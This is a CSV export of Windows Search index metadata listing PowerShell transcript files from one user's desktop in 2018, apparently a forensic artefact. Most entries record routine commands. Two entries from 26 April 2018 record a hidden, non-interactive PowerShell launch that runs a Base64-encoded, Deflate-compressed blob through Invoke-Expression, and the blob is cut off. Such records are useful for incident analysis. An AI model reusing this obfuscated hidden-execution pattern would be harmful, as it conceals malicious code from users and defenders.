0F-InvertedOnlyMD5,0-InvertedOnlyPids,11-System_FileName,13F-System_Size,14F-System_FileAttributes,15F-System_DateModified,16F-System_DateCreated,17F-System_DateAccessed,33-System_ItemUrl,3-System_ItemFolderNameDisplay,4165-System_ComputerName,4334-System_ContentType,4346-System_DateImported,4352-System_Document_DateCreated,4354-System_Document_DateSaved,4373-System_FileExtension,4377-System_FileOwner,4378-System_FilePlaceholderStatus,4410-System_IsAttachment,4412-System_IsEncrypted,4415-System_IsFolder,4419-System_ItemDate,4421-System_ItemFolderPathDisplay,4422-System_ItemFolderPathDisplayNarrow,4423-System_ItemName,4424-System_ItemNameDisplay,4425-System_ItemNameDisplayWithoutExtension,4428-System_ItemPathDisplay,4429-System_ItemPathDisplayNarrow,4431-System_ItemType,4437-System_Kind,4438-System_KindText,4453-System_MIMEType,4540-System_NotUserContent,4546-System_ParsingName,4604-System_SFGAOFlags,4605-System_Search_AccessCount,4606-System_Search_AutoSummary,4612F-System_Search_GatherTime,4614-System_Search_LastIndexedTotalTime,4618-System_Search_Store,4655-System_ThumbnailCacheId,4679-System_VolumeId,5-System_ItemTypeText,WorkID
"D978B65FC2852C55D6A4196493089AA7","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","1100","Archive (32)","19/03/2018 16:14:22.5039620","19/03/2018 16:14:22.2295252","19/03/2018 16:14:22.2295252","file:C:/Users/maxpowers/Documents/20180319/PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","20180319","DESKTOP-EDSLQM8","text/plain","19/03/2018 16:14:22.5039620","19/03/2018 16:14:22.5039620","19/03/2018 16:14:22.5039620",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","19/03/2018 16:14:22.5039620","C:\Users\maxpowers\Documents\20180319","20180319 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421","C:\Users\maxpowers\Documents\20180319\PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421 (C:\Users\maxpowers\Documents\20180319)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.mqA+0ycu.20180319101421.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180319101422
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -ExecutionPolicy RemoteSigned -command [Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
Process ID: 2940
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
PS>$global:?
True
**********************
Windows Powe","19/03/2018 16:14:52.8945689","0,015625","file","43C5BBFBECFA92AA","804cb650-0000-0000-0000-501f00000000","Text Document","2331"
"8D53167FEFE45A589D1973784F5EB0E3","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","1100","Archive (32)","19/03/2018 16:17:04.0849942","19/03/2018 16:17:03.8721130","19/03/2018 16:17:03.8721130","file:C:/Users/maxpowers/Documents/20180319/PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","20180319","DESKTOP-EDSLQM8","text/plain","19/03/2018 16:17:04.0000000","19/03/2018 16:17:04.0000000","19/03/2018 16:17:04.0849942",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","19/03/2018 16:17:04.0849942","C:\Users\maxpowers\Documents\20180319","20180319 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703","C:\Users\maxpowers\Documents\20180319\PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703 (C:\Users\maxpowers\Documents\20180319)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.I8VuZMDY.20180319101703.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180319101703
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -ExecutionPolicy RemoteSigned -command [Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
Process ID: 5808
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
PS>$global:?
True
**********************
Windows Powe","19/03/2018 16:17:12.1699751","0,015625","file","F550B0A6A25B477F","804cb650-0000-0000-0000-501f00000000","Text Document","2395"
"0701B8801028E0F34635D6501A6C4648","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","779","Archive (32)","19/03/2018 16:55:58.2637499","19/03/2018 16:55:53.6074514","19/03/2018 16:55:53.6074514","file:C:/Users/maxpowers/Documents/20180319/PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","20180319","DESKTOP-EDSLQM8","text/plain","19/03/2018 16:55:54.0000000","19/03/2018 16:55:54.0000000","19/03/2018 16:55:58.2637499",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","19/03/2018 16:55:58.2637499","C:\Users\maxpowers\Documents\20180319","20180319 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553","C:\Users\maxpowers\Documents\20180319\PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553 (C:\Users\maxpowers\Documents\20180319)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.JMx6ifiR.20180319105553.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180319105553
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
Process ID: 4476
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents\stuff'
PS C:\Users\maxpowers\Documents\stuff> start cmd
","19/03/2018 16:55:58.6133611","0,03125","file","816AFC8E12E36C21","804cb650-0000-0000-0000-501f00000000","Text Document","2396"
"C7547C5DEFDA02EA02B095B35AAF78C7","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","3492","Archive (32)","20/03/2018 19:38:47.3234449","20/03/2018 19:38:45.1830952","20/03/2018 19:38:45.1830952","file:C:/Users/maxpowers/Documents/20180320/PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","20180320","DESKTOP-EDSLQM8","text/plain","20/03/2018 19:38:46.0000000","20/03/2018 19:38:46.0000000","20/03/2018 19:38:47.3234449",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","20/03/2018 19:38:47.3234449","C:\Users\maxpowers\Documents\20180320","20180320 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845","C:\Users\maxpowers\Documents\20180320\PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845 (C:\Users\maxpowers\Documents\20180320)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.RomKX4lG.20180320133845.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180320133845
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
Process ID: 1568
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Set-Location): ""Set-Location""
>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_ecd17cef-25df-4783-9c0c-5463ae6ad2ec""
PS>& ""C:\WINDOWS\TEMP\SDIAG_ecd17cef-25df-4783-9c0c-5463ae6ad2ec\TS_WERQueue.ps1""
**********************
Windows PowerShell transcript start
Start time: 20180320133846
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers","20/03/2018 19:39:16.1048238","0","file","D2BEB62E4662FBA7","804cb650-0000-0000-0000-501f00000000","Text Document","2401"
"74FCBDDC7758DE20A6B24DE5EE1E2E93","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","3492","Archive (32)","03/04/2018 21:40:23.1103247","03/04/2018 21:40:21.1728908","03/04/2018 21:40:21.1728908","file:C:/Users/maxpowers/Documents/20180403/PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","20180403","DESKTOP-EDSLQM8","text/plain","03/04/2018 21:40:22.0000000","03/04/2018 21:40:22.0000000","03/04/2018 21:40:23.1103247",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","03/04/2018 21:40:23.1103247","C:\Users\maxpowers\Documents\20180403","20180403 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021","C:\Users\maxpowers\Documents\20180403\PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021 (C:\Users\maxpowers\Documents\20180403)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.5HpsS60_.20180403154021.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180403154021
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
Process ID: 5620
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Set-Location): ""Set-Location""
>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_9986555f-50a8-4bb6-a24f-0aed57f51cec""
PS>& ""C:\WINDOWS\TEMP\SDIAG_9986555f-50a8-4bb6-a24f-0aed57f51cec\TS_WERQueue.ps1""
**********************
Windows PowerShell transcript start
Start time: 20180403154021
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers","03/04/2018 21:40:23.2042442","0,03125","file","A95CEC7AA370A00D","804cb650-0000-0000-0000-501f00000000","Text Document","2426"
"576B260AA8423E9CA26FE8952AD73B7C","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","3709","Archive (32)","26/04/2018 15:37:55.3804416","26/04/2018 15:37:54.1773010","26/04/2018 15:37:54.1773010","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:37:55.3804416","26/04/2018 15:37:55.3804416","26/04/2018 15:37:55.3804416",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:37:55.3804416","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.z0HOIQZY.20180426093753.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180426093754
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:37:57.2242502","0,015625","file","F091BF5274A378A5","804cb650-0000-0000-0000-501f00000000","Text Document","2428"
"4B1B20C9F46807D63146F8D1D30F3902","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","3709","Archive (32)","26/04/2018 15:40:38.9432095","26/04/2018 15:40:05.9742011","26/04/2018 15:40:05.9742011","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:40:06.0000000","26/04/2018 15:40:06.0000000","26/04/2018 15:40:38.9432095",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:40:38.9432095","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.doHem5wf.20180426094005.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180426094005
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:40:38.9898676","0,015625","file","D1D48D46A51280F1","804cb650-0000-0000-0000-501f00000000","Text Document","2430"
"E2B06E8DB61C3D0692B5CA75FD25AA3E","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","3492","Archive (32)","10/04/2018 23:38:54.0871162","10/04/2018 23:38:52.2119404","10/04/2018 23:38:52.2119404","file:C:/Users/maxpowers/Documents/20180410/PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","20180410","DESKTOP-EDSLQM8","text/plain","10/04/2018 23:38:54.0000000","10/04/2018 23:38:54.0000000","10/04/2018 23:38:54.0871162",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","10/04/2018 23:38:54.0871162","C:\Users\maxpowers\Documents\20180410","20180410 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852","C:\Users\maxpowers\Documents\20180410\PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852 (C:\Users\maxpowers\Documents\20180410)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.Wb6OXvg9.20180410173852.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180410173852
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
Process ID: 1936
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Set-Location): ""Set-Location""
>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_dc0d1113-0a1f-410a-ba34-35c2c813954a""
PS>& ""C:\WINDOWS\TEMP\SDIAG_dc0d1113-0a1f-410a-ba34-35c2c813954a\TS_WERQueue.ps1""
**********************
Windows PowerShell transcript start
Start time: 20180410173852
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers","10/04/2018 23:38:54.1649146","0","file","36A6901A2A77669E","804cb650-0000-0000-0000-501f00000000","Text Document","2434"
"13D44A0878BF291BC83A73B61FE8CE99","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","1100","Archive (32)","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.1435351","09/04/2018 16:45:41.1435351","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.3625987","09/04/2018 16:45:41.3625987",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 16:45:41.3625987","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.rv2uZUBM.20180409104540.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180409104541
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -noprofile -ExecutionPolicy RemoteSigned -command [Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
Process ID: 7684
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>[Console]::OutputEncoding=[System.Text.Encoding]::UTF8
$output=[environment]::GetEnvironmentVariable('Path','User')
[Console]::WriteLine($output)
PS>$global:?
True
**********************
Windows Powe","09/04/2018 16:45:43.8628058","0","file","C931CF2A8DC6BC88",,"Text Document","2435"
"EA1DDE466FFBF738880DE4688039419B","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","701","Archive (32)","09/04/2018 17:29:37.9092986","09/04/2018 17:29:18.0096804","09/04/2018 17:29:18.0096804","file:C:/Users/maxpowers/Documents/20180409/PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","20180409","DESKTOP-EDSLQM8","text/plain","09/04/2018 17:29:20.0000000","09/04/2018 17:29:20.0000000","09/04/2018 17:29:37.9092986",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","09/04/2018 17:29:37.9092986","C:\Users\maxpowers\Documents\20180409","20180409 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917","C:\Users\maxpowers\Documents\20180409\PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917 (C:\Users\maxpowers\Documents\20180409)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.zekZRqZU.20180409112917.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180409112918
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Projects\ProjectC'
Process ID: 6692
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Projects\ProjectC'
","09/04/2018 17:29:38.1854410","0,046875","file","BBEE392DC2195BFF","804cb650-0000-0000-0000-501f00000000","Text Document","2436"
